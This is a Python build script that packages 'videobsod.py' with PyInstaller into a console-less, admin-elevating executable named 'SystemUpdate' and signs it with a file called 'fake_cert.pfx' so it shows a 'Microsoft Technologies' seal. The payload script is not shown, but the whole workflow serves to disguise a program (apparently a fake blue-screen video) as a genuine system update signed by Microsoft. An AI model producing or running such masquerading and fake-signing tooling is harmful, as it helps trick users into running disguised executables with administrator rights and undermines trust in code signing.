import PyInstaller.__main__
import subprocess
import os
import glob

# --- CONFIGURATION ---
SCRIPT_NAME = "videobsod.py"
EXE_NAME = "SystemUpdate"
CERT_FILE = "fake_cert.pfx"
CERT_PASS = "1234"
ICON_FILE = "resources/appicon.ico"
VERSION_FILE = "version_info.txt"

def find_signtool():
    """Locates signtool.exe automatically in Windows SDK folders."""
    search_paths = [
        r"C:\Program Files (x86)\Windows Kits\10\bin\*\x64\signtool.exe",
        r"C:\Program Files (x86)\Windows Kits\11\bin\*\x64\signtool.exe"
    ]
    for path in search_paths:
        found = glob.glob(path)
        if found:
            return found[-1]
    return "signtool.exe"

def build_system_update():
    print(f"[1/2] Building {EXE_NAME}.exe...")
    
    params = [
        SCRIPT_NAME,
        '--onefile',
        '--noconsole',
        '--uac-admin',
        f'--icon={ICON_FILE}',
        f'--version-file={VERSION_FILE}',
        '--add-data=resources;resources', # Bundles your mp4, jpg, and ico
        f'--name={EXE_NAME}',
        '--clean',
        '-y'
    ]
    
    PyInstaller.__main__.run(params)

def sign_system_update():
    exe_path = os.path.join("dist", f"{EXE_NAME}.exe")
    if not os.path.exists(exe_path):
        print("[ERROR] Build failed. EXE not found in 'dist' folder.")
        return

    signtool = find_signtool()
    print(f"[2/2] Signing {exe_path} with {CERT_FILE}...")

    # The command that adds the "Microsoft Technologies" digital seal
    cmd = [
        signtool, "sign",
        "/f", CERT_FILE,
        "/p", CERT_PASS,
        "/fd", "SHA256",            # Fixes the 'Digest Algorithm' error
        "/t", "http://timestamp.digicert.com",
        "/v", exe_path
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print("\n" + "="*30)
            print("SUCCESS: SystemUpdate.exe is ready!")
            print(f"Location: {os.path.abspath(exe_path)}")
            print("="*30)
        else:
            print(f"\n[SIGNING ERROR]\n{result.stderr}")
    except Exception as e:
        print(f"[ERROR] Could not run signtool: {e}")

if __name__ == "__main__":
    # Ensure resources exist before building
    if not os.path.exists("resources"):
        print("[ERROR] 'resources' folder missing! Create it first.")
    else:
        build_system_update()
        sign_system_update()
